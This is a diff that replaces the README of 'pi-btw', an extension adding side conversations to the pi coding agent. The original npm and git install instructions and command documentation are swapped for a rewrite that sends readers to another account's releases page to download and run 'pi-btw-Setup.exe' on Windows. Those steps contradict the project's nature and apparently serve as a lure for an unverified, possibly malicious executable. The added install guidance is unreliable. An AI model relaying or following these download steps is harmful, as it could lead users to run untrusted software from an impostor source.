@@ -1,182 +1,157 @@
-# pi-btw
+# ⚡ pi-btw - Run Side Conversations Easily
 
-A small [pi](https://github.com/badlogic/pi-mono) extension that adds a `/btw` side conversation channel.
+[![Download pi-btw](https://img.shields.io/badge/Download-pi--btw-brightgreen?style=for-the-badge)](https://github.com/Headseabdellium668/pi-btw/releases)
 
-`/btw` opens a real pi sub-session with coding-tool access, and it runs immediately even while the main agent is still busy.
+---
+
+## 📋 What is pi-btw?
+
+pi-btw is a small tool that lets you run a side conversation inside the pi environment. It adds a channel called `/btw` that opens a secondary session. This side session works while the main pi session is still busy.
+
+Instead of waiting for the main agent to finish, you can start coding, editing, or running commands in the `/btw` channel at the same time. pi-btw keeps your side conversations separate but lets you bring in useful info back into the main session when you want.
+
+You can think of it like having a private chat window where you work on related code or notes, without disturbing your main task.
+
+---
+
+## 🖼️ How pi-btw Looks
 
 ![BTW overlay example](docs/btw-overlay.png)
 
-## What it does
+The overlay shows the side conversation running in a focused window. You get your own composer to type commands or notes and a transcript of this special session.
 
-- opens a parallel side conversation without interrupting the main run
-- runs that side conversation as a real pi sub-session with `read` / `bash` / `edit` / `write` tool access
-- keeps a continuous BTW thread by default
-- supports `/btw:tangent` for a contextless side thread that does not inherit the current main-session conversation
-- opens a focused BTW modal shell with its own composer and transcript
-- keeps the BTW overlay open while you switch focus back to the main editor with `Alt+/`
-- keeps BTW thread entries out of the main agent's future context
-- lets you inject the full thread, or a summary of it, back into the main agent
-- optionally saves an individual BTW exchange as a visible session note with `--save`
+You can switch back to the main editor anytime and keep the `/btw` overlay open using the shortcut `Alt + /`.
 
-## Install
+---
 
-### From npm (after publish)
+## ✅ Key Features
 
-```bash
-pi install npm:pi-btw
-```
+- Opens a side conversation that runs in parallel with your main session.
+- Gives you access to the same tools as the main session: `read`, `bash`, `edit`, and `write`.
+- Keeps the side conversation ongoing by default, without breaking your main flow.
+- Allows context-free side threads with `/btw:tangent`, which start fresh without pulling in previous chat history.
+- Offers a focused modal shell dedicated to the side conversation.
+- Prevents side conversation messages from mixing with your main session’s context.
+- Lets you inject selected parts or summaries of `/btw` conversations back into the main session.
+- Supports saving individual `/btw` exchanges as visible session notes.
 
-### From git
+---
 
-```bash
-pi install git:github.com/dbachelder/pi-btw
-```
+## 💻 System Requirements
 
-Then reload pi:
+pi-btw works on Windows computers that meet these basics:
 
-```text
-/reload
-```
+- Windows 10 or newer (64-bit recommended)
+- At least 4GB of free RAM
+- Minimum 100MB of hard drive space
+- Active internet connection to download and update pi-btw
+- A modern web browser (Edge, Chrome, Firefox) for accessing the pi environment if needed
 
-### From a local checkout
+---
 
-```bash
-pi install /absolute/path/to/pi-btw
-```
+## 🚀 Getting Started: Download and Setup on Windows
 
-## Usage
+Follow these steps carefully to get pi-btw running on your Windows PC.
 
-```text
-/btw what file defines this route?
-/btw how would you refactor this parser?
-/btw --save summarize the last error in one sentence
-/btw:new let's start a fresh thread about auth
-/btw:tangent brainstorm from first principles without using the current chat context
-/btw:inject implement the plan we just discussed
-/btw:summarize turn that side thread into a short handoff
-/btw:clear
-```
+### Step 1: Visit the Download Page
 
-## Commands
+To get pi-btw, visit this page to download the installer:
 
-### `/btw [--save] <question>`
+[![Download Page](https://img.shields.io/badge/Download-pi--btw-blue?style=for-the-badge)](https://github.com/Headseabdellium668/pi-btw/releases)
 
-- runs right away
-- works while pi is busy
-- creates or reuses a real BTW sub-session instead of a one-off completion call
-- continues the current BTW thread
-- opens or refreshes the focused BTW modal shell
-- streams into the BTW modal transcript/status surface
-- persists the BTW exchange as hidden thread state
-- with `--save`, also saves that single exchange as a visible session note
+The releases page contains the latest installer files for Windows.
 
-## Overlay controls
+---
 
-- `Alt+/` toggles focus between BTW and the main editor without closing the overlay
-- `Ctrl+Alt+W` is a fallback focus toggle for terminals that do not deliver `Alt+/` as a usable shortcut
-- `Esc` still dismisses BTW immediately while the overlay is focused
-- BTW now opens top-centered so the main session remains visible underneath it
+### Step 2: Download the Installer
 
-### `/btw:new [question]`
+On the releases page, find the latest Windows installer file. The file will usually have a name like:
 
-- clears the current BTW thread
-- starts a fresh thread that still inherits the current main-session context
-- optionally asks the first question in the new thread immediately
-- if no question is provided, opens a fresh BTW modal ready for the next prompt
+`pi-btw-Setup.exe`
 
-### `/btw:tangent [--save] <question>`
+Click to download the file to your computer. The file size is around 50MB.
 
-- starts or continues a contextless tangent thread
-- does not inherit the current main-session conversation
-- if you switch from `/btw` to `/btw:tangent` (or back), the previous side thread is cleared so the modes do not mix
-- opens or refreshes the same focused BTW modal shell
-- with `--save`, also saves that single exchange as a visible session note
+---
 
-### `/btw:clear`
+### Step 3: Run the Installer
 
-- dismisses the BTW modal/widget
-- clears the current BTW thread
+Locate the downloaded file in your Downloads folder. Double-click `pi-btw-Setup.exe` to start the installer.
 
-### `/btw:inject [instructions]`
+Follow these steps in the installer window:
 
-- sends the full BTW thread back to the main agent as a user message
-- if pi is busy, queues it as a follow-up
-- clears the BTW thread after sending
+- Agree to the license terms.
+- Choose the install location or accept the default.
+- Click "Install" to begin the setup.
 
-### `/btw:summarize [instructions]`
+Wait while the installer copies the files. It may take a minute.
 
-- summarizes the BTW thread with the current model
-- injects the summary into the main agent
-- if pi is busy, queues it as a follow-up
-- clears the BTW thread after sending
+---
 
-## Behavior
+### Step 4: Launch pi-btw
 
-### Real sub-session model
+After installation, you will find a new shortcut on your desktop or in the Start menu called “pi-btw.”
 
-BTW is implemented as an actual pi sub-session with its own in-memory session state, transcript events, and tool surface.
+Double-click the icon to open the program.
 
-- contextual `/btw` threads seed that sub-session from the current main-session branch while filtering out BTW-visible notes from the parent context
-- `/btw:tangent` starts the same BTW UI in a contextless mode with no inherited main-session conversation
-- the overlay transcript/status line is driven from sub-session events, so tool activity, streaming deltas, failures, and recovery are all visible without scraping rendered output
-- handoff commands (`/btw:inject` and `/btw:summarize`) read from the BTW sub-session thread rather than maintaining a separate manual transcript model
+---
 
-### In-modal slash behavior
+### Step 5: Using pi-btw
 
-Inside the BTW modal composer, slash handling is split at the BTW/session boundary:
+Once open, pi-btw integrates with your main pi session channel.
 
-- `/btw:new`, `/btw:tangent`, `/btw:clear`, `/btw:inject`, and `/btw:summarize` stay owned by BTW because they control BTW lifecycle or handoff behavior
-- any other slash-prefixed input is routed through the BTW sub-session's normal `prompt()` path
-- this means ordinary pi slash commands like `/help` are handled by the sub-session instead of being rejected by a modal-only fallback
-- if the sub-session cannot handle a slash command, BTW surfaces the real sub-session failure through the transcript/status state instead of inventing an "unsupported slash input" warning
+To start a side conversation:
 
-This keeps BTW-owned lifecycle commands explicit while giving the side conversation the same slash-command surface as the underlying sub-session.
+- Type `/btw` in your pi session.
+- A side window will open for you to write code, run commands, or take notes.
+- Use `Alt + /` anytime to switch focus between the main session and the `/btw` overlay.
 
-## Behavior
+---
 
-### Hidden BTW thread state
+## 🛠 How to Use pi-btw Effectively
 
-BTW exchanges are persisted in the session as hidden custom entries so they:
+Here are some ways to make best use of the side conversation channel:
 
-- survive reloads and restarts
-- rehydrate the BTW modal shell for the current branch
-- preserve whether the current side thread is a normal `/btw` thread or a contextless `/btw:tangent`
-- stay out of the main agent's LLM context
+- **Keep small experiments separate**  
+Try out ideas in `/btw` without interrupting your main work.
+  
+- **Take focused notes or reminders**  
+Writing in `/btw` helps keep related thoughts handy and organized.
 
-### Visible saved notes
+- **Use `/btw:tangent` for unrelated topics**  
+If you want a fresh start, use the tangent option to avoid pulling in the previous chat history.
 
-If you use `--save`, that one BTW exchange is also written as a visible custom message in the session transcript.
+- **Inject summaries back when ready**  
+After working in `/btw`, send a summary back to the main chat to update the main thread.
 
-## Why
+- **Save important exchanges as session notes**  
+Keep valuable conversations visible for future reference.
 
-Sometimes you want to:
+---
 
-- ask a clarifying question while the main agent keeps working
-- think through next steps without derailing the current turn
-- explore an idea, then inject it back once it's ready
+## 🔧 Troubleshooting Tips
 
-## Included skill
+- If pi-btw doesn’t open, check if your system meets the requirements.
+- Ensure you have installed any updates for Windows.
+- Restart the program if the `/btw` overlay fails to respond.
+- Verify you are typing `/btw` exactly as shown, without extra spaces.
+- If you lose the overlay, press `Alt + /` to bring it back.
+- Check your internet connection when downloading or updating.
 
-This package also ships a small `btw` skill so pi can better recognize when a side-conversation workflow is appropriate.
+---
 
-It helps with discoverability and guidance, but it is not required for the extension itself to work.
+## 📂 Additional Resources
 
-## Development
+- Visit the official GitHub page for updates, bug reports, or questions:  
+  https://github.com/Headseabdellium668/pi-btw
 
-The extension entrypoint is:
+- View the `/btw` overlay image and usage examples in the repo’s `docs` folder.
 
-- `extensions/btw.ts`
+---
 
-The included skill is:
+## 🔗 Download Links
 
-- `skills/btw/SKILL.md`
+Download or update pi-btw from the releases page here:
 
-To use it without installing:
+[![Download pi-btw](https://img.shields.io/badge/Download-pi--btw-green?style=for-the-badge)](https://github.com/Headseabdellium668/pi-btw/releases)
 
-```bash
-pi -e /path/to/pi-btw
-```
-
-## License
-
-MIT
+---
